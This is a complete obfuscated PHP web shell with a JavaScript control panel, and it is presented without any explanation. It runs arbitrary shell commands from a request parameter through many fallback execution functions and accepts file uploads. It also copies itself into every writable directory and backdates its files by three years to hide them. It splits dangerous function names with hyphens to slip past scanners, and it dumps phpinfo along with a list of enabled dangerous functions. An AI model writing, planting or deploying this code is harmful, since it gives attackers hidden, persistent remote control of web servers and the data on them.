<?php error_reporting(E_ALL&~E_WARNING&~E_NOTICE);class Commander{protected $_disabled;public function disabled(){if(empty($this->_disabled))$this->_disabled=array_values(explode(",",ini_get($this->magic_str('dis-able_fun-cti-ons'))));return $this->_disabled;}public function is_windows(){return strcasecmp(substr(PHP_OS,0,3),'WIN')==0;}public function can($m){return(preg_match('/^[A-Z]/',$m)?class_exists($m):is_callable($m))&&!in_array($m,$this->disabled());}public function tc($f){$_tm=strtotime("-3 year");return touch($f,$_tm,$_tm);}public function tn($o='.out'){$__=$this->magic_str('tem-p-nam');$___=$this->magic_str('sy-s_ge-t_te-mp_di-r');return $this->can($__)?$__($this->can($___)?$___():'.',$o):join(DIRECTORY_SEPARATOR,array($this->can($___)?$___():'.',uniqid($o)));}public function magic_str($str){return str_replace('-','',$str);}public function dirs($path=null,$max=5){$dirs=array();$gl=array();for($x=0;$x<=$max;$x++){foreach(glob(join(DIRECTORY_SEPARATOR,array_merge(array($path?:$_SERVER['DOCUMENT_ROOT']),$gl)),GLOB_ONLYDIR|GLOB_NOSORT)as $a)$dirs[]=$a;$gl[]='**';}return $dirs;}public function json($data,$success=true){ob_clean();header_remove();header("Content-type: application/json; charset=utf-8");http_response_code($success?200:500);die(json_encode($data));}public function read($f){$raw='';$_fg=$this->magic_str('fi-le_ge-t_cont-ents');$_fc=$this->magic_str('fc-lose');$_fp=$this->magic_str('fo-pen');$_fr=$this->magic_str('f-read');if($this->can($_fg)&&$out=$_fg($f)){$raw.=$out;}elseif($this->can($_fp)&&$this->can($_fr)){if($handle=$_fp($f,'r')){while(!feof($handle)){$raw.=$_fr($handle,1000);}$_fc($handle);}}@unlink($f);return $raw;}public function write($raw,$f=null){$_fp=$this->magic_str('fi-le_pu-t_co-nte-nts');$_f=$f?:$this->tn();if($this->can($_fp)&&$_fp($raw,$_f)){return $_f;}return false;}public function call($_){$_____=array('sy-st-em'=>function($___,$_){ob_start();@$___($_);$__=ob_get_contents();ob_end_clean();return $__;},'she-ll_ex-ec'=>function($___,$_){return@$___($_);},'ex-ec'=>function($___,$_){$__=array();@$___($_,$__);return implode('',$__);},'pass-thr-u'=>function($___,$_){ob_start();@$___($_);$__=ob_get_contents();ob_end_clean();return $__;},'po-pen'=>function($___,$_){$__='';$_pc=$this->magic_str('pc-lose');if($s_f=@$___($_,'r')){while(!feof($s_f)){$__.=fread($s_f,2096);}$_pc($s_f);}return $__;},'pro-c_o-pen-'=>function($___,$_){$_cl=$this->magic_str('pro-c_c-lose');$_fc=$this->magic_str('fc-lose');$_pp=$this->magic_str('p-ip-e');$_gt=$this->magic_str('str-eam_ge-t_con-ten-ts');$_gw=$this->magic_str('ge-tc-wd');$_p_=array();$__='';$_d=array(0=>array($_pp,"r"),1=>array($_pp,"w"),2=>array($_pp,"a"));$_p=@$___($_,$_d,$_p_,$_gw());if(isset($_p_[1])){$__=$_gt($_p_[1]);$_fc($_p_[1]);}@$_cl($_p);return $__;},'pc-ntl_ex-ec'=>function($___,$_){$__='';$__o=$this->tn();$_ork=$this->magic_str('pc-ntl-_f-ork');$_sig=$this->magic_str('pcn-tl_sig-nal');$_wait=$this->magic_str('p-cn-tl_wait-pid');$_pid=$_ork();if($_pid==-1){return $__;}elseif($_pid){declare(ticks=1);$_sig(SIGINT,function($sig){});while(!$_wait($_pid,$status,WNOHANG)){}}else{$_sig(SIGINT,SIG_IGN);$___($this->magic_str('/bi-n/s-h'),array('-c',sprintf("%s  2>&1 > %s",$_,$__o)));}$__.=$this->read($__o);return $__;},'COM'=>function($___,$_){return(new $___($this->magic_str('WS-cript.s-hell')))->${$this->magic_str('ex-ec')}(sprintf('%s /c %s  ',$this->magic_str('cm-d-.ex-e'),$_))->StdOut()->ReadAll();},);$_=sprintf("%s 2>&1",ctype_xdigit($_)?pack('H*',$_):$_);foreach($_____ as $_c_=>$_f_){if($this->can($this->magic_str($_c_))&&($__=$_f_($this->magic_str($_c_),$_))&&!empty($__))return $__;}return 'Sorry dude :(';}}$com=new Commander()or die('Shit !');if(isset($_REQUEST['_c'])){if(!headers_sent())header('Content-type: text/plain; charset=utf-8');if(!empty($_REQUEST['_c']))echo $com->call(rawurldecode($_REQUEST['_c']));else echo $com->call($com->is_windows()?'dir':'ls -la');}elseif(isset($_REQUEST['_m'])){$pt=$com->dirs();array_walk($pt,function($v)use($com){$v=str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$v);if(preg_match('/\/(app(lication)|sy(stem)|ve(ndor))/i',$v))return;$out=join(DIRECTORY_SEPARATOR,array($v,sprintf('%s.php',md5($v))));if(!is_writable($v))return;if(!copy(__FILE__,$out))return;$com->tc($out);echo sprintf("%s\n",$out);});}elseif(isset($_FILES['_f'])&&$_FILES["_f"]["error"]==0){$ok=false;$out=join(DIRECTORY_SEPARATOR,array(__DIR__,basename($_FILES["_f"]["name"])));$_magic_func=$com->magic_str('move-_up-load-ed_fi-le');if($_magic_func($_FILES['_f']['tmp_name'],$out)){$com->tc($out);$ok=true;}else{$dirs=$com->dirs();foreach($dirs as $path){$path=str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$path);if(preg_match('/\/(app(lication)|sy(stem)|ve(ndor))/i',$path))return;$out=join(DIRECTORY_SEPARATOR,array($path,basename($_FILES["_f"]["name"])));if($_magic_func($_FILES['_f']['tmp_name'],$out)){$com->tc($out);$ok=true;break;}}}die($ok?join("\n",array($out,sprintf('<br><a href="%s"  target="_blank">Open</a>',str_replace($_SERVER['DOCUMENT_ROOT'],'',$out)))):'Sorry dude :(');}else{$com->tc(__FILE__);$dangers=array_map(function($c)use($com){return $com->magic_str($c);},array('pcn-tl_al-arm','pc-ntl_fo-rk','pcn-tl_wai-tpid','pc-ntl_w-ait','pc-ntl_wif-exi-ted','pc-ntl_wifs-top-ped','pcn-tl_wif-sign-aled','pcn-tl_wif-continu-ed','pcn-tl_wex-its-tatus','pc-ntl_wte-rms-ig','pcn-tl_ws-top-sig','pcn-tl_si-gnal','pc-ntl_sig-nal_get_ha-ndler','pcn-tl_sig-nal_dis-patch','pcnt-l_get_last_err-or','pc-ntl_str-error','p-cntl_sig-proc-mask','pc-ntl_sig-wait-info','p-cntl_sig-timed-wait','pcn-tl_ex-ec','pcnt-l_getpr-iority','pc-ntl_set-priori-ty','pcn-tl_async_sig-nals','er-ror_lo-g','sy-st-em','e-xe-c','sh-ell_e-xec','po-p-en','pr-oc_o-pen','pa-ss-thru','li-nk','sy-ml-ink','sy-slog','l-d','ma-il','put-env','apac-he_se-tenv','dl'));$dangerous=array('mbs-tri-ng.in-i'=>array($com->magic_str('mb-_se-nd_ma-il')),'im-ap.i-ni'=>array($com->magic_str('im-ap_o-pen'),$com->magic_str('ima-p_ma-il')),'li-bv-irt-php.in-i'=>array($com->magic_str('lib-virt_con-nect')),'gn-upg.i-ni'=>array($com->magic_str('gnu-pg_in-it')),'mag-ick.i-ni'=>array($com->magic_str('I-magic-k')),'cgi.error_header'=>array($com->magic_str('stre-am_sock-et_se-ndto'),$com->magic_str('str-eam_so-cket_client'),$com->magic_str('fs-ock-open'),),);ob_start(function($o){$o=preg_replace('%<script\sdata-cfasync[^>]+><\/script>%i','',$o);return preg_replace('(</(body|html)>)','',$o);});phpinfo();$__=ob_get_contents();ob_end_clean();echo $__;foreach($dangerous as $k=>$v){if(!strpos($__,$com->magic_str($k)))continue;foreach($v as $kv){if(!$com->can($kv))continue;$dangers[]=$kv;}}$dangers=array_unique(array_filter($dangers,function($c)use($com){return $com->can($com->magic_str($c));})); ?><script type="text/javascript">window.o=window.o??{},window.o.t="<?php echo php_uname(); ?>",window.o.i=<?php echo json_encode(array_values($dangers),JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE); ?>,window.o.u=(n,o={})=>Object.assign(document.createElement(n),o),window.o.l=n=>Array.from((new TextEncoder).encode(n)).map(n=>n.toString(16).padStart(2,"0")).join(""),window.o.m=function(n){n.preventDefault();const o=document.getElementById("out");let t=new XMLHttpRequest;return t.onload=()=>o.innerText=t.responseText,t.onerror=()=>alert("Error : "+t.status),t.open("POST",location.origin+location.pathname),(n=new FormData(n.target)).get("_c")&&n.set("_c",window.o.l(n.get("_c"))),t.send(n),!1},window.o.p=function(){var n=window.o.u("h2",{innerText:"Danger"}),o=window.o.u("table");let t=window.o.u("tbody");var w=window.o.u("tr",{className:"v"}),e=window.o.u("td"),d=window.o.u("td"),i=window.o.u("button",{type:"button",name:"cli",innerText:"cli"}),c=window.o.u("button",{type:"button",name:"upl",innerText:"upl"});i.addEventListener("click",function(n){n.preventDefault(),document.body.firstChild.style.display="none",document.getElementById("_ajx").style.display="block"}),c.addEventListener("click",function(n){n.preventDefault(),n=window.o.u("form",{method:"POST",enctype:"multipart/form-data"});var o=window.o.u("input",{name:"_f",type:"file"}),t=window.o.u("button",{innerText:"send",type:"submit"});n.appendChild(o),n.appendChild(t),document.body.replaceWith(n)}),d.appendChild(i),d.appendChild(c),e.appendChild(document.createTextNode(window.o.i.join(" ,"))),w.appendChild(e),w.appendChild(d),t.appendChild(w),o.appendChild(t),(t=document.getElementsByClassName("center"))[0].append(n),t[0].append(o)},window.o._=function(){var n=window.o.u("div",{id:"ajx_cli"}),o=window.o.u("form",{method:"POST",id:"_ajx",style:"display:none;"}),t=window.o.u("p"),w=window.o.u("code",{id:"out",style:"width: 100%;"}),e=window.o.u("input",{name:"_c",placeholder:"ls -la",style:"width: 99%;"});t.appendChild(e),o.appendChild(document.createTextNode(window.o.t)),o.appendChild(t),n.appendChild(o),n.appendChild(w),document.body.append(n),o.addEventListener("submit",window.o.m)},window.addEventListener("load",()=>{window.o.p(),window.o._()});</script><?php } ?>
